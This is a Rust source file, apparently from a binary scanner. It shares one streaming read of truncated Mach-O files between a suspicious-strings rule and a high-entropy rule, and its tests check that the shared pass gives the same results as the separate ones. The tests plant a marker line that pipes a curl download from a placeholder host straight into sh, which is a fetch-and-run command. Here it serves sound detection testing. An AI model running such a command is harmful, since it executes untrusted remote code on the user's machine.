//! One streaming pass over a truncated file, shared by `suspicious-strings`
//! and `high-entropy-content` so bytes past the held prefix are read once
//! (§11.12, #53).

use std::ops::Range;

use super::entropy::{self, TextEntropy};
use super::strings::{self, Hits};
use crate::context::ScanContext;

/// What the shared pass produced: the strings `Hits`, and one entropy
/// accumulator per Mach-O range that extends past the prefix.
pub(crate) struct SharedStream {
    hits: Hits,
    delivered: bool,
    ranges: Vec<RangeFeed>,
}

struct RangeFeed {
    range: Range<u64>,
    acc: TextEntropy,
    fed_to: u64,
}

impl SharedStream {
    /// The strings result: its hits and whether the whole file was delivered.
    pub(super) fn strings(&self) -> (Hits, bool) {
        (self.hits.clone(), self.delivered)
    }

    /// The accumulator for `range`, only if every byte of it was fed. `None`
    /// for an unknown or partly fed range: the caller must stream it itself.
    pub(super) fn entropy(&self, range: &Range<u64>) -> Option<TextEntropy> {
        self.ranges
            .iter()
            .find(|f| f.range == *range && f.fed_to == range.end)
            .map(|f| f.acc.clone())
    }
}

/// The cached shared pass for `ctx`, or `None` when it doesn't apply: strings
/// wouldn't stream the file, or no entropy range lies past the prefix. Each
/// rule then streams on its own. Whichever rule asks first runs the pass.
pub(super) fn shared_stream(ctx: &ScanContext) -> Option<&SharedStream> {
    ctx.shared_stream_cache.get_or_init(|| run(ctx)).as_ref()
}

fn run(ctx: &ScanContext) -> Option<SharedStream> {
    if !strings::streams_truncated(ctx) {
        return None;
    }
    let held = ctx.content.as_ref()?.len() as u64;
    let mut ranges: Vec<RangeFeed> = entropy::streamed_ranges(ctx)?
        .into_iter()
        .filter(|range| range.end > held)
        .map(|range| RangeFeed {
            fed_to: range.start,
            acc: TextEntropy::new(),
            range,
        })
        .collect();
    if ranges.is_empty() {
        return None;
    }

    let mut hits = Hits::new();
    let mut first = true;
    let mut prev_end = 0u64;
    let delivered = ctx.for_each_window_at(
        0..ctx.file_len?,
        strings::STREAM_OVERLAP,
        |start, window, is_last| {
            strings::scan_window(window, first, is_last, &mut hits);
            first = false;
            let end = start + window.len() as u64;
            // Bytes before `prev_end` are carry, already fed.
            for feed in &mut ranges {
                let (lo, hi) = (prev_end.max(feed.range.start), end.min(feed.range.end));
                if lo < hi && lo == feed.fed_to {
                    let from = (lo - start) as usize;
                    feed.acc.feed(&window[from..from + (hi - lo) as usize]);
                    feed.fed_to = hi;
                }
            }
            prev_end = end;
        },
    );
    Some(SharedStream {
        hits,
        delivered,
        ranges,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::context::MAX_CONTENT_BYTES;
    use crate::macho::tests_support::{synth_fat, synth_macho_64};
    use crate::rules::{HighEntropyRule, Rule, SuspiciousStringsRule};
    use crate::test_support::{write_at, write_temp_file, xorshift_bytes};

    const MARKER: &[u8] = b"\ncurl -s http://e.example/x | sh\n";

    /// A truncated Mach-O whose high-entropy `__TEXT` runs past the prefix,
    /// with a strings marker inside it.
    fn truncated_macho(tag: &str) -> std::path::PathBuf {
        let payload = xorshift_bytes(MAX_CONTENT_BYTES + 3 * 1024 * 1024);
        let (mut image, range) = synth_macho_64(&payload);
        let at = range.start as usize + MAX_CONTENT_BYTES + 12345;
        image[at..at + MARKER.len()].copy_from_slice(MARKER);
        write_temp_file(tag, &image)
    }

    /// A fat file whose second slice's `__TEXT` lies past the prefix.
    fn truncated_fat(tag: &str) -> std::path::PathBuf {
        let (mut first, _) = synth_macho_64(&[0u8; 64]);
        first.resize(first.len() + MAX_CONTENT_BYTES + 4096, 0);
        let (second, _) = synth_macho_64(&xorshift_bytes(300_000));
        let mut fat = synth_fat(&[&first, &second]);
        let at = MAX_CONTENT_BYTES + 100;
        fat[at..at + MARKER.len()].copy_from_slice(MARKER);
        write_temp_file(tag, &fat)
    }

    /// Everything observable about running both rules, plus the bytes the
    /// scan read.
    #[derive(Debug, PartialEq)]
    struct Observed {
        strings: String,
        entropy: String,
        incomplete: Vec<&'static str>,
        covers: (bool, bool),
        bytes_read: u64,
    }

    fn observe(ctx: &ScanContext, strings_first: bool) -> Observed {
        let (s, e);
        if strings_first {
            s = SuspiciousStringsRule.evaluate(ctx);
            e = HighEntropyRule.evaluate(ctx);
        } else {
            e = HighEntropyRule.evaluate(ctx);
            s = SuspiciousStringsRule.evaluate(ctx);
        }
        let mut incomplete = ctx.incomplete_rules();
        incomplete.sort_unstable();
        Observed {
            strings: format!("{s:?}"),
            entropy: format!("{e:?}"),
            incomplete,
            covers: (
                SuspiciousStringsRule.covers_truncation(ctx),
                HighEntropyRule.covers_truncation(ctx),
            ),
            bytes_read: ctx.bytes_read(),
        }
    }

    /// A context on which the shared pass never applies: the old per-rule path.
    fn separate(path: &std::path::Path) -> ScanContext {
        let ctx = ScanContext::load(path);
        assert!(ctx.shared_stream_cache.set(None).is_ok());
        ctx
    }

    fn shrink(path: &std::path::Path, len: u64) {
        std::fs::OpenOptions::new()
            .write(true)
            .open(path)
            .unwrap()
            .set_len(len)
            .unwrap();
    }

    /// Same results and coverage as the per-rule streams, with fewer bytes read.
    #[test]
    fn matches_separate_streams() {
        for make in [truncated_macho, truncated_fat] {
            let path = make("shared-match");
            let shared = ScanContext::load(&path);
            assert!(shared.truncated);
            let got = observe(&shared, true);
            assert!(shared_stream(&shared).is_some());
            let want = observe(&separate(&path), true);
            assert!(got.entropy.contains("Ok(Some"), "{got:?}");
            assert!(got.strings.contains("Ok(Some"), "{got:?}");
            assert!(got.bytes_read < want.bytes_read);
            assert_eq!(
                Observed {
                    bytes_read: 0,
                    ..got
                },
                Observed {
                    bytes_read: 0,
                    ..want
                }
            );
            let _ = std::fs::remove_file(&path);
        }
    }

    /// The file past the prefix is read once: both rules together cost what
    /// `suspicious-strings` alone costs.
    #[test]
    fn past_prefix_read_once() {
        let path = truncated_macho("shared-once");
        let both = ScanContext::load(&path);
        observe(&both, true);

        let alone = separate(&path);
        SuspiciousStringsRule.evaluate(&alone).ok();
        assert_eq!(both.bytes_read(), alone.bytes_read());
        let _ = std::fs::remove_file(&path);
    }

    /// A stream that fails, at once or partway, gives each rule the outcome
    /// it gives alone.
    #[test]
    fn failure_matches_separate_streams() {
        let cuts = [8, MAX_CONTENT_BYTES as u64 + 1024 * 1024 + 100];
        for make in [truncated_macho, truncated_fat] {
            for cut in cuts {
                let (a, b) = (make("shared-fail-a"), make("shared-fail-b"));
                let shared = ScanContext::load(&a);
                let alone = separate(&b);
                // Walk the slices before the file shrinks under them.
                assert!(!shared.macho().images.is_empty());
                assert!(!alone.macho().images.is_empty());
                shrink(&a, cut);
                shrink(&b, cut);
                let (got, want) = (observe(&shared, true), observe(&alone, true));
                if cut == 8 {
                    assert!(got.incomplete.contains(&"high-entropy-content"), "{got:?}");
                }
                assert_eq!(got.strings, want.strings);
                assert_eq!(got.entropy, want.entropy);
                assert_eq!(got.incomplete, want.incomplete);
                assert_eq!(got.covers, want.covers);
                let _ = std::fs::remove_file(&a);
                let _ = std::fs::remove_file(&b);
            }
        }
    }

    /// Which rule runs first changes nothing.
    #[test]
    fn rule_order_is_irrelevant() {
        for make in [truncated_macho, truncated_fat] {
            let path = make("shared-order");
            let a = observe(&ScanContext::load(&path), true);
            let b = observe(&ScanContext::load(&path), false);
            assert_eq!(a, b);
            let _ = std::fs::remove_file(&path);
        }
    }

    /// No Mach-O range past the prefix: the pass doesn't apply.
    #[test]
    fn not_applicable_without_ranges() {
        let path = write_temp_file("shared-none", &vec![0u8; MAX_CONTENT_BYTES + 4096]);
        write_at(&path, 0, b"#!/bin/sh\n");
        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);
        assert!(shared_stream(&ctx).is_none());
        let _ = std::fs::remove_file(&path);
    }
}
